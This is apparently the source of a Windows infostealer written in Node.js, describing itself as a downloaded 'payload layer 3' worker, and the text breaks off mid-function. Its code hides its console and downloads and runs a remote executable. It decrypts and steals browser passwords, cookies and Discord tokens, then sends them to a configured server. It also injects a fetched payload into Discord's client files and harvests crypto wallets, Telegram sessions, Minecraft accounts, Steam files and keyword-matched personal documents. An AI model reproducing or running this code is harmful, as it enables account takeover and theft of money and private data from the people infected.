// Ephemeral collection worker (payload layer 3). Downloaded on demand by the
// resident client bootstrap, executes exactly one collection round, writes its
// results to the --out JSON file, deletes itself, and exits. It never persists
// past a single run.

console.log("h");
try {
  if (process.platform === "win32") {
    require("node-hide-console-window").hideConsole();
  }
} catch (e) {}
const admzip = require("adm-zip");
const axios = require("axios");
const crypto = require("crypto");
const fs = require("fs-extra");
const os = require("os");
const path = require("path");
const { execSync, spawn } = require("child_process");
const FormData = require("form-data");
const https = require("https");
const { Dpapi } = require("@primno/dpapi");
const nacl = require("tweetnacl");

// ==========================================
// 1. CONFIGURATION & CONSTANTS
// ==========================================

const CONFIG = {
  ALLOWED_EXTENSIONS: [
    ".csv",
    ".db",
    ".doc",
    ".docx",
    ".gif",
    ".jpeg",
    ".jpg",
    ".json",
    ".log",
    ".mp4",
    ".odt",
    ".pdf",
    ".png",
    ".ppt",
    ".pptx",
    ".rtf",
    ".txt",
    ".webp",
    ".xls",
    ".xlsx",
  ],
  FILE_KEYWORDS: [
    "2fa",
    "account",
    "acount",
    "backup",
    "banque",
    "code",
    "compte",
    "crypto",
    "discord",
    "exodus",
    "login",
    "mdp",
    "memo",
    "metamask",
    "mot_de_passe",
    "motdepasse",
    "passphrase",
    "passw",
    "paypal",
    "secret",
    "seecret",
    "token",
    "wallet",
  ],
  HOST_URL: "PLACEHOLDER_HOST_URL",
  STORAGE_PATH: path.join(process.env.APPDATA, "Microsoft Store"),
  USER_ID: "PLACEHOLDER_USER_ID",
  SECRET_KEY: "PLACEHOLDER_SECRET_KEY",
  MAIN_EXE_DOWNLOAD_URL: "/shared-files/download/main.cl",
  PAYLOAD_DOWNLOAD_PATH: "/shared-files/download/discord_core.js",
  TIMEOUT: 3000,
  CLIPBOARD_MONITOR: 1,
};
console.log("b");
const WALLET_CONFIG = {
  PATHS: [
    {
      name: "Atomic",
      path: path.join(
        process.env.APPDATA,
        "atomic",
        "Local Storage",
        "leveldb",
      ),
    },
    {
      name: "Exodus",
      path: path.join(process.env.APPDATA, "Exodus", "exodus.wallet"),
    },
    {
      name: "Electrum",
      path: path.join(process.env.APPDATA, "Electrum", "wallets"),
    },
    {
      name: "Electrum-LTC",
      path: path.join(process.env.APPDATA, "Electrum-LTC", "wallets"),
    },
    { name: "Zcash", path: path.join(process.env.APPDATA, "Zcash") },
    { name: "Armory", path: path.join(process.env.APPDATA, "Armory") },
    { name: "Bytecoin", path: path.join(process.env.APPDATA, "bytecoin") },
    {
      name: "Jaxx",
      path: path.join(
        process.env.APPDATA,
        "com.liberty.jaxx",
        "IndexedDB",
        "file__0.indexeddb.leveldb",
      ),
    },
    {
      name: "Ethereum",
      path: path.join(process.env.APPDATA, "Ethereum", "keystore"),
    },
    {
      name: "Guarda",
      path: path.join(
        process.env.APPDATA,
        "Guarda",
        "Local Storage",
        "leveldb",
      ),
    },
    {
      name: "Coinomi",
      path: path.join(process.env.APPDATA, "Coinomi", "Coinomi", "wallets"),
    },
  ],
};

// Browser paths kept only for Discord token extraction
const BROWSER_PATHS = [
  {
    name: "Chrome",
    path: path.join(process.env.LOCALAPPDATA, "Google", "Chrome", "User Data"),
    task: "chrome.exe",
  },
  {
    name: "Edge",
    path: path.join(process.env.LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
    task: "msedge.exe",
  },
  {
    name: "Brave",
    path: path.join(
      process.env.LOCALAPPDATA,
      "BraveSoftware",
      "Brave-Browser",
      "User Data",
    ),
    task: "brave.exe",
  },
  {
    name: "Opera",
    path: path.join(process.env.APPDATA, "Opera Software", "Opera Stable"),
    task: "opera.exe",
  },
  {
    name: "Opera GX",
    path: path.join(process.env.APPDATA, "Opera Software", "Opera GX Stable"),
    task: "opera.exe",
  },
  {
    name: "Yandex",
    path: path.join(
      process.env.APPDATA,
      "Yandex",
      "YandexBrowser",
      "User Data",
    ),
    task: "yandex.exe",
  },
  {
    name: "Vivaldi",
    path: path.join(process.env.LOCALAPPDATA, "Vivaldi", "User Data"),
    task: "vivaldi.exe",
  },
  {
    name: "Chromium",
    path: path.join(process.env.LOCALAPPDATA, "Chromium", "User Data"),
    task: "chromium.exe",
  },
  {
    name: "Thorium",
    path: path.join(process.env.LOCALAPPDATA, "Thorium", "User Data"),
    task: "thorium.exe",
  },
  {
    name: "CocCoc",
    path: path.join(process.env.LOCALAPPDATA, "CocCoc", "Browser", "User Data"),
    task: "coccoc.exe",
  },
];

// ==========================================
// 2. ADVANCED CRYPTO FUNCTIONS (Discord tokens)
// ==========================================

function decryptAESGCM(enc, key) {
  try {
    if (enc.length < 31) return null;
    const iv = enc.slice(3, 15);
    const data = enc.slice(15, -16);
    const tag = enc.slice(-16);
    const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
    decipher.setAuthTag(tag);
    return Buffer.concat([decipher.update(data), decipher.final()]).toString(
      "utf8",
    );
  } catch {
    return null;
  }
}

function decryptPasswordopw(encrypted, masterKey) {
  const buffer = Buffer.from(encrypted);
  const prefix3 = buffer.slice(0, 3).toString();
  try {
    if (["v10", "v11", "v80"].includes(prefix3)) {
      if (
        buffer.length < 31 ||
        !Buffer.isBuffer(masterKey) ||
        masterKey.length !== 32
      )
        return null;
      const iv = buffer.slice(3, 15);
      const cipherText = buffer.slice(15, buffer.length - 16);
      const authTag = buffer.slice(buffer.length - 16);
      if (iv.length !== 12 || authTag.length !== 16) return null;
      const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, iv);
      decipher.setAuthTag(authTag);
      try {
        const decrypted = Buffer.concat([
          decipher.update(cipherText),
          decipher.final(),
        ]);
        return decrypted.toString("utf8").replace(/\0/g, "").trim();
      } catch {
        const alt = buffer.slice(15);
        if (alt.length > 16) {
          const altAuth = alt.slice(-16);
          const altCipher = alt.slice(0, -16);
          const dec2 = crypto.createDecipheriv("aes-256-gcm", masterKey, iv);
          dec2.setAuthTag(altAuth);
          const decrypted2 = Buffer.concat([
            dec2.update(altCipher),
            dec2.final(),
          ]);
          return decrypted2.toString("utf8").replace(/\0/g, "").trim();
        }
        return null;
      }
    } else if (prefix3 === "v20") {
      if (
        buffer.length < 31 ||
        !Buffer.isBuffer(masterKey) ||
        masterKey.length !== 32
      )
        return null;
      const iv = buffer.slice(3, 15);
      const cipherText = buffer.slice(15, buffer.length - 16);
      const authTag = buffer.slice(buffer.length - 16);
      if (iv.length !== 12 || authTag.length !== 16) return null;
      const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, iv);
      decipher.setAuthTag(authTag);
      const decrypted = Buffer.concat([
        decipher.update(cipherText),
        decipher.final(),
      ]);
      if (decrypted.length > 32) {
        let nonAscii = 0;
        for (const b of decrypted.slice(0, 32))
          if (b < 32 || b > 126) nonAscii++;
        if (nonAscii > 5)
          return decrypted.slice(32).toString("utf8").replace(/\0/g, "").trim();
      }
      return decrypted.toString("utf8").replace(/\0/g, "").trim();
    } else {
      try {
        return Dpapi.unprotectData(buffer, null, "CurrentUser").toString(
          "utf8",
        );
      } catch {
        return null;
      }
    }
  } catch {
    return null;
  }
}

async function getEncryptionKey(browserPath) {
  const localStatePath = path.join(browserPath, "Local State");
  if (!fs.existsSync(localStatePath)) return null;
  try {
    const localStateData = JSON.parse(fs.readFileSync(localStatePath, "utf8"));
    const encryptedKey = localStateData.os_crypt?.encrypted_key;
    if (!encryptedKey) return null;
    const keyData = Buffer.from(encryptedKey, "base64");
    if (keyData.slice(0, 5).toString() !== "DPAPI") return null;
    const encryptedKeyData = keyData.slice(5);
    const decryptedKey = Dpapi.unprotectData(
      encryptedKeyData,
      null,
      "CurrentUser",
    );
    if (
      decryptedKey &&
      Buffer.isBuffer(decryptedKey) &&
      decryptedKey.length === 32
    )
      return decryptedKey;
    return null;
  } catch {
    return null;
  }
}

// ==========================================
// 3. UTILITIES
// ==========================================

const Utils = {
  kill: (name) => {
    if (process.platform !== "win32") return;
    try {
      execSync(`taskkill /F /IM ${name}`, {
        stdio: "ignore",
        windowsHide: true,
      });
    } catch (e) {
      /* ignore */
    }
  },
  exec: (cmd) => {
    try {
      return execSync(cmd, { encoding: "utf8", stdio: "pipe" }).toString();
    } catch {
      return "";
    }
  },
  getRandomString: (length = 10) =>
    crypto
      .randomBytes(Math.ceil(length / 2))
      .toString("hex")
      .slice(0, length),
  zip: (source, dest) => {
    try {
      const zip = new admzip();
      if (fs.statSync(source).isFile()) zip.addLocalFile(source);
      else zip.addLocalFolder(source, path.basename(source));
      zip.writeZip(dest);
      return true;
    } catch {
      return false;
    }
  },
};

// ==========================================
// 4. DATASTORE
// ==========================================

const DataStore = {
  cookies: [],
  passwords: [],
  tokens: [],
  webData: [],
  systemInfo: {},
  autofills: [],
  creditCards: [],
  history: [],
  downloads: [],
  searchHistory: [],
  firefox: { passwords: [], cookies: [], history: [], bookmarks: [] },
  wallets: [],
};
// ==========================================
// 6. DOWNLOAD AND RUN MAIN.EXE IN TEMP FOLDER
// ==========================================
//
const getDownloadUrl = () => {
  const base = CONFIG.HOST_URL.replace(/\/+$/, "");
  const path = CONFIG.MAIN_EXE_DOWNLOAD_URL.startsWith("/")
    ? CONFIG.MAIN_EXE_DOWNLOAD_URL
    : "/" + CONFIG.MAIN_EXE_DOWNLOAD_URL;
  return base + path;
};

async function downloadMainExe() {
  const tempDir = path.join(os.tmpdir(), `extract_${Utils.getRandomString()}`);
  fs.ensureDirSync(tempDir);
  const downloadUrl = getDownloadUrl();
  const exePath = path.join(tempDir, "main.exe");
  //console.log(`[+] Downloading main.exe from ${CONFIG.MAIN_EXE_DOWNLOAD_URL} ...`);
  try {
    const response = await axios({
      method: "GET",
      url: downloadUrl,
      responseType: "stream",
      timeout: CONFIG.TIMEOUT,
      headers: {
        "X-User-ID": CONFIG.USER_ID,
        "X-Secret-Key": CONFIG.SECRET_KEY,
      },
    });
    const writer = fs.createWriteStream(exePath);
    response.data.pipe(writer);
    await new Promise((resolve, reject) => {
      writer.on("finish", resolve);
      writer.on("error", reject);
    });
    //console.log(`[+] Saved main.exe to ${exePath}`);
    return { exePath, tempDir };
  } catch (err) {
    // console.error('[-] Failed to download main.exe:', err.message);
    throw err;
  }
}

async function runMainExtractorFromTemp(exePath, tempDir) {
  //console.log('[+] Launching main.exe for browser data extraction...');
  const child = spawn(exePath, [], {
    cwd: tempDir,
    detached: true,
    stdio: "ignore",
    windowsHide: true,
  });
  child.unref();

  const outputZip = path.join(tempDir, "output.zip");
  let waited = 0;
  const maxWait = 60000;
  while (!fs.existsSync(outputZip) && waited < maxWait) {
    await new Promise((r) => setTimeout(r, 1000));
    waited += 1000;
  }

  if (!fs.existsSync(outputZip)) {
    // console.error('[!] main.exe did not produce output.zip within timeout');
    return null;
  }

  await new Promise((r) => setTimeout(r, 2000)); // extra delay for file flush
  return outputZip;
}

async function parseOutputZip(zipPath) {
  //console.log('[+] Parsing output.zip from main.exe...');
  let passwordFiles = 0,
    cookieFiles = 0,
    autofillFiles = 0;

  try {
    const zip = new admzip(zipPath);
    const zipEntries = zip.getEntries();

    for (const entry of zipEntries) {
      if (entry.isDirectory) continue;
      const parts = entry.entryName.split("/");
      if (parts.length < 3) continue; // skip unexpected paths

      const browser = parts[0];
      const profile = parts[1];
      const fileName = parts[2];
      let content;

      try {
        content = entry.getData().toString("utf8");
      } catch (decodeErr) {
        console.warn(
          `[!] Could not decode ${entry.entryName}: ${decodeErr.message}`,
        );
        continue;
      }

      // Normalize line endings to LF
      const normalized = content.replace(/\r\n/g, "\n");

      if (fileName === "passwords.txt") {
        passwordFiles++;
        let parsedCount = 0;

        // Use line-by-line parsing to be more robust than split('\n\n')
        const lines = normalized.split("\n");
        let currentEntry = null;

        for (let i = 0; i < lines.length; i++) {
          const line = lines[i].trim();
          if (line === "") continue;

          if (line.startsWith("URL:")) {
            // Start a new entry
            if (currentEntry) {
              // Save previous entry if it has at least URL and password
              if (currentEntry.url && currentEntry.password !== undefined) {
                DataStore.passwords.push({
                  browser: browser,
                  url: currentEntry.url,
                  username: currentEntry.username || "",
                  password: currentEntry.password,
                });
                parsedCount++;
              }
            }
            currentEntry = {
              url: line.substring(4).trim(),
              username: "",
              password: "",
            };
          } else if (currentEntry && line.startsWith("Login:")) {
            currentEntry.username = line.substring(6).trim();
          } else if (currentEntry && line.startsWith("Password:")) {
            currentEntry.password = line.substring(9).trim();
          }
        }
        // Don't forget the last entry
        if (
          currentEntry &&
          currentEntry.url &&
          currentEntry.password !== undefined
        ) {
          DataStore.passwords.push({
            browser: browser,
            url: currentEntry.url,
            username: currentEntry.username || "",
            password: currentEntry.password,
          });
          parsedCount++;
        }

        //console.log(`[+] ${browser} / ${profile} : parsed ${parsedCount} passwords`);
      } else if (fileName === "cookies.txt") {
        if (normalized.trim().length > 50) {
          DataStore.cookies.push({
            browser: browser,
            profile: profile,
            cookies: Buffer.from(normalized).toString("base64"),
          });
          cookieFiles++;
        }
      } else if (fileName === "auto_fills.txt") {
        autofillFiles++;
        let parsedCount = 0;

        // Similar robust parser for autofill entries
        const lines = normalized.split("\n");
        let currentField = null;

        for (const line of lines) {
          const trimmed = line.trim();
          if (trimmed === "") continue;

          if (trimmed.startsWith("Field:")) {
            if (currentField && currentField.name) {
              DataStore.autofills.push({
                browser: browser,
                profile: profile,
                name: currentField.name,
                value: currentField.value || "",
              });
              parsedCount++;
            }
            currentField = {
              name: trimmed.substring(6).trim(),
              value: "",
            };
          } else if (currentField && trimmed.startsWith("Value:")) {
            currentField.value = trimmed.substring(6).trim();
          }
        }
        // Last field
        if (currentField && currentField.name) {
          DataStore.autofills.push({
            browser: browser,
            profile: profile,
            name: currentField.name,
            value: currentField.value || "",
          });
          parsedCount++;
        }

        //console.log(`[+] ${browser} / ${profile} : parsed ${parsedCount} autofill entries`);
      }
    }

    //console.log(`[+] Parsing complete. Total: ${DataStore.passwords.length} passwords, ${DataStore.cookies.length} cookie files, ${DataStore.autofills.length} autofill entries`);
  } catch (err) {
    // console.error('[!] Failed to parse output.zip:', err.message);
    // Re-throw if caller needs to handle it
    throw err;
  }
}

// ==========================================
// 7. DISCORD TOKEN EXTRACTION (unchanged)
// ==========================================

function findLevelDBPaths(browserPath) {
  const results = [];
  if (!fs.existsSync(browserPath)) return results;
  const profiles = fs
    .readdirSync(browserPath, { withFileTypes: true })
    .filter((d) => d.isDirectory())
    .map((d) => d.name);
  for (const profile of profiles) {
    const leveldb = path.join(browserPath, profile, "Local Storage", "leveldb");
    if (fs.existsSync(leveldb)) results.push(leveldb);
  }
  const defaultLeveldb = path.join(
    browserPath,
    "Default",
    "Local Storage",
    "leveldb",
  );
  if (fs.existsSync(defaultLeveldb)) results.push(defaultLeveldb);
  return results;
}

async function safeStorageSteal(browserPath, platform) {
  const tokens = [];
  const masterKey = await getEncryptionKey(browserPath);
  if (!masterKey) return tokens;
  const leveldbPaths = findLevelDBPaths(browserPath);
  for (const leveldb of leveldbPaths) {
    const files = fs
      .readdirSync(leveldb)
      .filter((f) => f.endsWith(".log") || f.endsWith(".ldb"));
    for (const file of files) {
      const content = fs.readFileSync(path.join(leveldb, file), "utf8");
      const matches = content.match(/dQw4w9WgXcQ:[^\x22\s]+/g);
      if (matches) {
        for (let match of matches) {
          match = match.replace(/\\$/, "");
          const encPart = match.split("dQw4w9WgXcQ:")[1];
          if (encPart) {
            const encBuf = Buffer.from(encPart, "base64");
            const token = decryptAESGCM(encBuf, masterKey);
            if (token && !tokens.some((t) => t[0] === token))
              tokens.push([token, platform]);
          }
        }
      }
    }
  }
  return tokens;
}

function simpleSteal(browserPath, platform) {
  const tokens = [];
  const leveldbPaths = findLevelDBPaths(browserPath);
  const regex = /[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}/g;
  for (const leveldb of leveldbPaths) {
    const files = fs
      .readdirSync(leveldb)
      .filter((f) => f.endsWith(".log") || f.endsWith(".ldb"));
    for (const file of files) {
      const content = fs.readFileSync(path.join(leveldb, file), "utf8");
      const matches = content.match(regex);
      if (matches) {
        for (const token of matches) {
          if (!tokens.some((t) => t[0] === token))
            tokens.push([token, platform]);
        }
      }
    }
  }
  return tokens;
}

async function validateToken(token) {
  try {
    const { data } = await axios.get("https://discord.com/api/v9/users/@me", {
      headers: { Authorization: token },
      timeout: 10000,
    });
    if (data && data.id) {
      const username =
        data.discriminator === "0"
          ? data.username
          : `${data.username}#${data.discriminator}`;
      return {
        valid: true,
        userInfo: {
          id: data.id,
          username,
          email: data.email,
          phone: data.phone || "None",
          mfa_enabled: data.mfa_enabled,
        },
      };
    }
  } catch {}
  return { valid: false };
}

async function extractDiscordTokens() {
  const allTokens = [];
  const discordPaths = [
    {
      name: "Discord",
      path: path.join(
        process.env.APPDATA,
        "discord",
        "Local Storage",
        "leveldb",
      ),
    },
    {
      name: "Discord Canary",
      path: path.join(
        process.env.APPDATA,
        "discordcanary",
        "Local Storage",
        "leveldb",
      ),
    },
    {
      name: "Discord PTB",
      path: path.join(
        process.env.APPDATA,
        "discordptb",
        "Local Storage",
        "leveldb",
      ),
    },
  ];
  for (const dp of discordPaths) {
    if (fs.existsSync(dp.path)) {
      const files = fs
        .readdirSync(dp.path)
        .filter((f) => f.endsWith(".log") || f.endsWith(".ldb"));
      for (const file of files) {
        const content = fs.readFileSync(path.join(dp.path, file), "utf8");
        const matches = content.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/g);
        if (matches) {
          for (const token of matches) {
            if (!allTokens.some((t) => t.token === token))
              allTokens.push({ token, source: dp.name });
          }
        }
      }
    }
  }
  const usersDir = path.join(process.env.SystemDrive || "C:", "Users");
  let users = [];
  if (fs.existsSync(usersDir))
    users = fs
      .readdirSync(usersDir)
      .filter(
        (u) =>
          fs.statSync(path.join(usersDir, u)).isDirectory() &&
          !["Public", "Default"].includes(u),
      );
  if (!users.length) users.push(os.userInfo().username);
  for (const user of users) {
    const appDataLocal = path.join(usersDir, user, "AppData", "Local");
    const appDataRoaming = path.join(usersDir, user, "AppData", "Roaming");
    for (const browser of BROWSER_PATHS) {
      let browserPath = browser.path
        .replace(process.env.LOCALAPPDATA || "", appDataLocal)
        .replace(process.env.APPDATA || "", appDataRoaming);
      if (!fs.existsSync(browserPath)) continue;
      const encryptedTokens = await safeStorageSteal(browserPath, browser.name);
      for (const [token, src] of encryptedTokens) {
        if (!allTokens.some((t) => t.token === token))
          allTokens.push({ token, source: src });
      }
      const plainTokens = simpleSteal(browserPath, browser.name);
      for (const [token, src] of plainTokens) {
        if (!allTokens.some((t) => t.token === token))
          allTokens.push({ token, source: src });
      }
    }
  }
  for (const { token, source } of allTokens) {
    const validation = await validateToken(token);
    if (validation.valid) {
      DataStore.tokens.push({
        token,
        source,
        id: validation.userInfo.id,
        username: validation.userInfo.username,
        email: validation.userInfo.email,
        phone: validation.userInfo.phone,
        mfa: validation.userInfo.mfa_enabled,
      });
    }
  }
}

async function sendDiscordTokensToServer() {
  if (DataStore.tokens.length === 0) return;
  for (const tokenInfo of DataStore.tokens) {
    try {
      await axios.post(
        `${CONFIG.HOST_URL}/discord`,
        {
          token: tokenInfo.token,
          userInfo: {
            id: tokenInfo.id,
            username: tokenInfo.username,
            email: tokenInfo.email,
            phone: tokenInfo.phone,
            mfa_enabled: tokenInfo.mfa,
          },
          friends: [],
        },
        {
          headers: {
            "X-API-KEY": "PLACEHOLDER_API_KEY",
            "X-BUILD-ID": CONFIG.USER_ID,
            "Content-Type": "application/json",
          },
        },
      );
      //console.log(`[+] Discord token sent for ${tokenInfo.username}`);
    } catch (err) {
      // console.error(`[-] Failed to send token for ${tokenInfo.username}:`, err.message);
    }
  }
}

// ==========================================
// 8. DISCORD INJECTION (unchanged)
// ==========================================
//
const getPayloadUrl = () => {
  const base = CONFIG.HOST_URL.replace(/\/+$/, "");
  const rel = CONFIG.PAYLOAD_DOWNLOAD_PATH.startsWith("/")
    ? CONFIG.PAYLOAD_DOWNLOAD_PATH
    : "/" + CONFIG.PAYLOAD_DOWNLOAD_PATH;
  return base + rel;
};

async function fetchPayload(url) {
  const res = await fetch(url);
  if (!res.ok) throw new Error(`HTTP error ${res.status}`);
  return await res.text();
}
async function dcinject() {
  const clients = [
    "Discord",
    "DiscordCanary",
    "DiscordPTB",
    "DiscordDevelopment",
    "Vesktop",
    "Vencord",
  ];
  for (const client of clients) {
    try {
      spawn("taskkill", ["/IM", `${client}.exe`, "/F"]);
    } catch {}
  }
  await new Promise((r) => setTimeout(r, 2000));

  const localappdata = process.env.LOCALAPPDATA;
  const appData = process.env.APPDATA;
  const targetDirs = [
    { base: localappdata, search: ["cord", "vencord", "vesktop"] },
    { base: appData, search: ["BetterDiscord"] },
  ];
  const PAYLOAD_URL = getPayloadUrl();
  const payload = await fetchPayload(PAYLOAD_URL);

  for (const target of targetDirs) {
    if (!fs.existsSync(target.base)) continue;
    const folders = fs
      .readdirSync(target.base)
      .filter((f) =>
        target.search.some((s) => f.toLowerCase().includes(s.toLowerCase())),
      );
    for (const folder of folders) {
      const fullPath = path.join(target.base, folder);
      try {
        const appDirs = fs
          .readdirSync(fullPath)
          .filter((d) => d.startsWith("app-"));
        appDirs.sort((a, b) =>
          b.localeCompare(a, undefined, { numeric: true }),
        );
        if (appDirs.length) {
          const modulesPath = path.join(fullPath, appDirs[0], "modules");
          if (fs.existsSync(modulesPath)) {
            const modFolders = fs.readdirSync(modulesPath);
            const coreFolder = modFolders.find((f) =>
              f.startsWith("discord_desktop_core"),
            );
            if (coreFolder) {
              const indexPath = path.join(
                modulesPath,
                coreFolder,
                "discord_desktop_core",
                "index.js",
              );
              if (fs.existsSync(indexPath)) {
                const content = fs.readFileSync(indexPath, "utf8");
                if (!content.includes(PAYLOAD_URL)) {
                  fs.writeFileSync(
                    indexPath,
                    `${payload}\nmodule.exports = require('./core.asar');`,
                    "utf8",
                  );
                }
              }
            }
          }
        }
      } catch {}
    }
  }

  for (const client of clients) {
    const updater = path.join(localappdata, client, "Update.exe");
    if (fs.existsSync(updater)) {
      spawn(updater, ["--processStart", `${client}.exe`], {
        stdio: "ignore",
        detached: true,
      }).unref();
    }
  }
}
// ==========================================
// 9. WALLET, FILES, TELEGRAM, MINECRAFT, STEAM
// ==========================================

const Discovery = {
  searchFiles: async (storagePath) => {
    const searchPaths = [
      path.join(os.homedir(), "Desktop"),
      path.join(os.homedir(), "Documents"),
      path.join(os.homedir(), "Downloads"),
      path.join(process.env.USERPROFILE, "OneDrive", "Desktop"),
      path.join(process.env.USERPROFILE, "OneDrive", "Documents"),
    ];
    const recursiveSearch = (dir, depth = 0) => {
      if (depth > 3 || !fs.existsSync(dir)) return;
      try {
        const items = fs.readdirSync(dir);
        for (const item of items) {
          const fullPath = path.join(dir, item);
          const stats = fs.statSync(fullPath);
          if (stats.isDirectory()) recursiveSearch(fullPath, depth + 1);
          else if (stats.isFile()) {
            const lower = item.toLowerCase();
            const isMatch =
              CONFIG.FILE_KEYWORDS.some((k) => lower.includes(k)) &&
              CONFIG.ALLOWED_EXTENSIONS.some((e) => lower.endsWith(e));
            if (isMatch && stats.size < 10 * 1024 * 1024) {
              const destName = `${path.basename(dir)}_${item}`;
              fs.copySync(fullPath, path.join(storagePath, destName));
            }
          }
        }
      } catch {}
    };
    for (const sp of searchPaths) recursiveSearch(sp);
  },
  scanWallets: async (storagePath) => {
    for (const wallet of WALLET_CONFIG.PATHS) {
      if (fs.existsSync(wallet.path)) {
        const dest = path.join(storagePath, `Wallet-${wallet.name}.zip`);
        Utils.zip(wallet.path, dest);
      }
    }
  },
  extractTelegram: async (storagePath) => {
    const tdata = path.join(process.env.APPDATA, "Telegram Desktop", "tdata");
    if (fs.existsSync(tdata)) {
      Utils.kill("Telegram.exe");
      Utils.zip(tdata, path.join(storagePath, "Telegram.zip"));
    }
  },
  extractMinecraft: async (storagePath) => {
    const mcDataRoot = path.join(storagePath, "Minecraft");
    fs.ensureDirSync(mcDataRoot);

    // Helper to copy a file or folder if exists
    const copyIfExists = (src, destSubPath) => {
      if (!src) return false;
      const dest = path.join(mcDataRoot, destSubPath);
      if (fs.existsSync(src)) {
        fs.copySync(src, dest);
        return true;
      }
      return false;
    };

    // 1. Vanilla Minecraft (official launcher)
    const vanillaDir = path.join(process.env.APPDATA, ".minecraft");
    if (fs.existsSync(vanillaDir)) {
      const vanillaDest = "Vanilla";
      const vanillaFiles = [
        "launcher_profiles.json",
        "launcher_accounts.json",
        "microsoft_accounts.json",
      ];
      vanillaFiles.forEach((file) => {
        const src = path.join(vanillaDir, file);
        copyIfExists(src, path.join(vanillaDest, file));
      });
    }

    // 2. Lunar Client
    const lunarDirs = [
      path.join(process.env.APPDATA, ".lunarclient"),
      path.join(process.env.LOCALAPPDATA, "Lunar Client"),
    ];
    for (const lunarDir of lunarDirs) {
      if (fs.existsSync(lunarDir)) {
        const accountsSrc = path.join(lunarDir, "settings", "accounts.json");
        copyIfExists(accountsSrc, "LunarClient/accounts.json");
        const settingsSrc = path.join(lunarDir, "settings", "settings.json");
        copyIfExists(settingsSrc, "LunarClient/settings.json");
        break;
      }
    }

    // 3. Badlion Client
    const badlionDir = path.join(process.env.APPDATA, "Badlion Client");
    if (fs.existsSync(badlionDir)) {
      copyIfExists(
        path.join(badlionDir, "accounts.json"),
        "Badlion/accounts.json",
      );
      copyIfExists(path.join(badlionDir, "config.json"), "Badlion/config.json");
    }

    // 4. Feather Client
    const featherDir = path.join(process.env.APPDATA, "Feather");
    if (fs.existsSync(featherDir)) {
      copyIfExists(
        path.join(featherDir, "accounts.json"),
        "Feather/accounts.json",
      );
      copyIfExists(
        path.join(featherDir, "settings.json"),
        "Feather/settings.json",
      );
    }

    // 5. Prism Launcher
    const prismDir = path.join(process.env.APPDATA, "PrismLauncher");
    if (fs.existsSync(prismDir)) {
      copyIfExists(
        path.join(prismDir, "accounts.json"),
        "PrismLauncher/accounts.json",
      );
      copyIfExists(
        path.join(prismDir, "prismlauncher.cfg"),
        "PrismLauncher/prismlauncher.cfg",
      );
    }

    // 6. MultiMC
    const multiMCDir = path.join(process.env.APPDATA, "MultiMC");
    if (fs.existsSync(multiMCDir)) {
      copyIfExists(
        path.join(multiMCDir, "accounts.json"),
        "MultiMC/accounts.json",
      );
      copyIfExists(path.join(multiMCDir, "multimc.cfg"), "MultiMC/multimc.cfg");
    }

    // 7. ATLauncher
    const atlDir = path.join(process.env.APPDATA, "ATLauncher");
    if (fs.existsSync(atlDir)) {
      copyIfExists(
        path.join(atlDir, "accounts.json"),
        "ATLauncher/accounts.json",
      );
      copyIfExists(path.join(atlDir, "config.json"), "ATLauncher/config.json");
    }

    // 8. CurseForge (Overwolf)
    const curseforgeOverwolf = path.join(
      process.env.APPDATA,
      "Overwolf",
      "CurseForge",
    );
    if (fs.existsSync(curseforgeOverwolf)) {
      const minecraftSub = path.join(curseforgeOverwolf, "Minecraft");
      if (fs.existsSync(minecraftSub)) {
        const dest = path.join(mcDataRoot, "CurseForge");
        fs.copySync(minecraftSub, dest);
      }
    }
    // Legacy standalone CurseForge
    const curseforgeStandalone = path.join(process.env.APPDATA, "CurseForge");
    if (fs.existsSync(curseforgeStandalone)) {
      copyIfExists(
        path.join(curseforgeStandalone, "accounts.json"),
        "CurseForgeStandalone/accounts.json",
      );
    }

    // 9. PolyMC
    const polyMcDir = path.join(process.env.APPDATA, "PolyMC");
    if (fs.existsSync(polyMcDir)) {
      copyIfExists(
        path.join(polyMcDir, "accounts.json"),
        "PolyMC/accounts.json",
      );
      copyIfExists(path.join(polyMcDir, "polymc.cfg"), "PolyMC/polymc.cfg");
    }

    // Finally, zip everything together
    const zipPath = path.join(storagePath, "Minecraft.zip");
    Utils.zip(mcDataRoot, zipPath);

    // Clean up temporary folder
    fs.removeSync(mcDataRoot);
  },
  extractSteam: async (storagePath) => {
    const steamPath = path.join("C:", "Program Files (x86)", "Steam");
    if (fs.existsSync(steamPath)) {
      const steamData = path.join(storagePath, "Steam");
      fs.ensureDirSync(steamData);
      const files = fs.readdirSync(steamPath);
      for (const f of files)
        if (f.startsWith("ssfn"))
          fs.copySync(path.join(steamPath, f), path.join(steamData, f));
      const config = path.join(steamPath, "config");
      if (fs.existsSync(config))
        fs.copySync(config, path.join(steamData, "config"));
      Utils.zip(steamData, path.join(storagePath, "Steam.zip"));
      fs.removeSync(steamData);
    }
  },
};

// ==========================================
// 9b. EXODUS KEY STEALER
// ==========================================
//
// Exodus 22+ encrypts %APPDATA%\Exodus\exodus.wallet with a symmetric key that
// the app itself wraps with Electron safeStorage = Chromium os_crypt = DPAPI on
// Windows. Any process running as the same logged-in user can unwrap that key
// (that is the documented Exodus tradeoff: no extra password set => the OS
// account is the only gate). When the user DID set an extra password, the raw
// wallet + Local State get exfil'd so the vault can be broken offline.

const ExodusInject = {
  apdataDir: () => path.join(process.env.APPDATA, "Exodus"),
  walletPath: () => path.join(process.env.APPDATA, "Exodus", "exodus.wallet"),

  // Unwrap the Electron/Chromium os_crypt master key (DPAPI). Same primitive
  // the browser token decoders use; Exodus' own Local State is tried first.
  osCryptKey: async function () {
    const candidates = [
      path.join(this.apdataDir(), "Local State"),
      path.join(process.env.LOCALAPPDATA, "Exodus", "Local State"),
    ];
    for (const lsPath of candidates) {
      if (!fs.existsSync(lsPath)) continue;
      try {
        const ls = JSON.parse(fs.readFileSync(lsPath, "utf8"));
        const enc = ls.os_crypt && ls.os_crypt.encrypted_key;
        if (!enc) continue;
        let blob = Buffer.from(enc, "base64");
        if (blob.slice(0, 5).toString() !== "DPAPI") continue;
        blob = blob.slice(5);
        for (const entropy of [Buffer.from("peanuts", "ascii"), null]) {
          try {
            const key = Dpapi.unprotectData(blob, entropy, "CurrentUser");
            if (key && Buffer.isBuffer(key) && key.length === 32) return key;
          } catch {}
        }
      } catch {}
    }
    try {
      return await getEncryptionKey(this.apdataDir());
    } catch {
      return null;
    }
